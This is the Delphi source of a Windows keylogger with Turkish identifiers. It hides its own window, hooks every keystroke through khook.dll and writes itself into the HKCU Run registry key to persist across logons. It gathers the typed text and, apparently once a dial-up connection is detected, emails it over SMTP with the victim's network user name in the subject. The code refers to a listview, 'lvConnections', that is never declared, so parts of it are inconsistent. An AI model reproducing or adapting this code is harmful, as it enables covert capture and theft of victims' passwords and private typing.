   unit prg;

   interface

   uses
     Shellapi,Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     StdCtrls, keybhook, ExtCtrls, NMsmtp, Psock, NMpop3,registry,ras,comctrls,
     HideApp, CPUSpeed;

   type
     TForm1 = class(TForm)
       memo1: TMemo;
       Button1: TButton;
       NMPOP31: TNMPOP3;
       NMSMTP1: TNMSMTP;
       h: TListView;
       btnHangup: TButton;
       btnActiveConn: TButton;
       baglanti_kontrolu: TTimer;
       baglandiktan_sonra: TTimer;
       HideApp1: THideApp;
       CP1: TCPUSpeed;
       Timer1: TTimer;
       procedure FormCreate(Sender: TObject);
       procedure FormDestroy(Sender: TObject);
       procedure Button1Click(Sender: TObject);
       procedure btnActiveConnClick(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);

     private
       procedure AddKey(var Message: TMessage);
       procedure WMHOOKNORMALKEY(var Message: TMessage); message WM_HOOKNORMALKEYDOWN;
       procedure WMHOOKENTERKEY(var Message: TMessage); message WM_HOOKENTERKEYDOWN;
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;

   implementation

   {$R *.DFM}
   procedure StartKeyBoardHook; external 'khook.dll' name 'STARTKEYBOARDHOOK';
   procedure StopKeyBoardHook; external 'khook.dll' name 'STOPKEYBOARDHOOK';
   function GetHookRecPointer:PHookRec; external 'khook.dll' name 'GETHOOKRECPOINTER';

   //********///

   function StatusString(state: TRasConnState; error: Longint): String;
     var
       c: Array[0..100] of Char;
       s: String;
     begin
     if error <> 0 then
       begin
       RasGetErrorString(error, c, 100);
       Result := c;
       end
     else
       begin
       s := '';
       case State of
         RASCS_OpenPort:
           s := 'Opening port';
         RASCS_PortOpened:
           s := 'Port opened';
         RASCS_ConnectDevice:
           s := 'Connecting device';
         RASCS_DeviceConnected:
           s := 'Device connected';
         RASCS_AllDevicesConnected:
           s := 'All devices connected';
         RASCS_Authenticate:
           s := 'Start authenticating';
         RASCS_AuthNotify:
           s := 'Authentication: notify';
         RASCS_AuthRetry:
           s := 'Authentication: retry';
         RASCS_AuthCallback:
           s := 'Authentication: callback';
         RASCS_AuthChangePassword:
           s := 'Authentication: change password';
         RASCS_AuthProject:
           s := 'Authentication: projecting';
         RASCS_AuthLinkSpeed:
           s := 'Authentication: link speed';
         RASCS_AuthAck:
           s := 'Authentication: acknowledge';
         RASCS_ReAuthenticate:
           s := 'Authentication: reauthenticate';
         RASCS_Authenticated:
           s := 'Authenticated';
         RASCS_PrepareForCallback:
           s := 'Preparing for callback';
         RASCS_WaitForModemReset:
           s := 'Waiting for modem reset';
         RASCS_WaitForCallback:
           s := 'Waiting for callback';
         RASCS_Projected:
           s := 'Projected';
         RASCS_StartAuthentication:
           s := 'Start authentication';
         RASCS_CallbackComplete:
           s := 'Callback complete';
         RASCS_LogonNetwork:
           s := 'Logging on network';

         RASCS_Interactive:
           s := 'Interactive';
         RASCS_RetryAuthentication:
           s := 'Retry Authentication';
         RASCS_CallbackSetByCaller:
           s := 'Callback set by caller';
         RASCS_PasswordExpired:
           s := 'Password expired';

         RASCS_Connected:
           s := 'Connected';
         RASCS_Disconnected:
           s := 'Disconnected';
         end;
       Result := s;
       end;
     end;



   ///*****////



   procedure TForm1.WMHOOKENTERKEY(var Message: TMessage);
   begin
     AddKey(Message);
   end;

   procedure TForm1.WMHOOKNORMALKEY(var Message: TMessage);
   begin
     AddKey(Message);
   end;


   procedure TForm1.AddKey(var Message: TMessage);
   var S: string;
   begin
     S := Format('%-10d %-10d ', [Message.WParam, Message.LParam]);
     Memo1.Lines.Text := Memo1.Lines.Text + Chr(Message.WParam);
   end;


   procedure TForm1.FormDestroy(Sender: TObject);
   begin
     StopKeyBoardHook;
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   var
     Reg1:TRegistry;
     s: string;
     i : integer;
   begin
     hideapp1.Execute;
     GetHookRecPointer^.TheCtrlWinHandle := Handle;
     StartKeyBoardHook;
     Reg1:=TRegistry.create;
     Reg1.RootKey:=HKEY_CURRENT_USER;
     Reg1.OpenKey('Software\MicroSoft\Windows\CurrentVersion\Run',True);
     reg1.WriteString('SysUsr','Usr.Exe');
   end;

   procedure TForm1.Button1Click(Sender: TObject);
   begin
     baglandiktan_sonra.enabled:=false;
     NMPOP31.Connect;
     NMSMTP1.connect;
     if NMPOP31.Connected then
       if NMSMTP1.Connected then
       begin
         nMSMTP1.PostMessage.Subject:=cp1.NetworkUser+' dan haberler';
         nmsmtp1.PostMessage.Body.Assign(memo1.lines);
         nmsmtp1.SendMail;
       end;
     NMSMTP1.Disconnect;
     NMPOP31.Disconnect;
   end;


   procedure TForm1.btnActiveConnClick(Sender: TObject);
     var
       bufsize: Longint;
       numEntries: Longint;
       x: Integer;
       entries: Array[1..100] of TRasConn;
       stat: TRasConnStatus;
     begin
     entries[1].dwSize := SizeOf(TRasConn);
     bufsize := SizeOf(TRasConn) * 100;
     btnHangup.Enabled := False;
     lvConnections.Items.Clear;
     FillChar(stat, Sizeof(TRasConnStatus), 0);
     stat.dwSize := Sizeof(TRasConnStatus);
     if RasEnumConnections(@entries[1], bufsize, numEntries) = 0 then
       begin
       if numEntries > 0 then
         begin
         for x := 1 to numEntries do
           with lvConnections.Items.Add, entries[x] do
             begin
             Data := Pointer(hrasconn);
             Caption := szEntryName;
             SubItems.Add(szDeviceType);
             SubItems.Add(szDeviceName);
             RasGetConnectStatus(hrasconn, stat);
             SubItems.Add(StatusString(stat.rasconnstate, stat.dwError));
             if (StatusString(stat.rasconnstate, stat.dwError)='Connected') then
               baglandiktan_sonra.Enabled:=true;
             end;
         lvConnections.ItemFocused := lvConnections.Items[0];
         btnHangup.Enabled := True;
         end;
       end

   end;
   procedure TForm1.Timer1Timer(Sender: TObject);
   var
     s : string;
     i : integer;
   begin
     s:=memo1.Text;
     for i:=1 to length(s) do
       begin
         case s[i] of
           'Û' : s[i]:='Ð';
           'Ý' : s[i]:='Ü';
           'º' : s[i]:='Þ';
           'Þ' : s[i]:='Ý';
           '¼' : s[i]:='Ö';
           '¾' : s[i]:='Ç';
           '¿' : s[i]:='.';
           'a' : s[i]:='1';
           'b' : s[i]:='2';
           'c' : s[i]:='3';
           'd' : s[i]:='4';
           'e' : s[i]:='5';
           'f' : s[i]:='6';
           'g' : s[i]:='7';
           'h' : s[i]:='8';
           'i' : s[i]:='9';
           '`' : s[i]:='0';
           'o' : s[i]:='/';
           'j' : s[i]:='*';
           'm' : s[i]:='-';
           'k' : s[i]:='+';
           '½' : s[i]:='-';
         end;
       end;
     memo1.Clear;
     memo1.Text:=s;
   end;
   end.
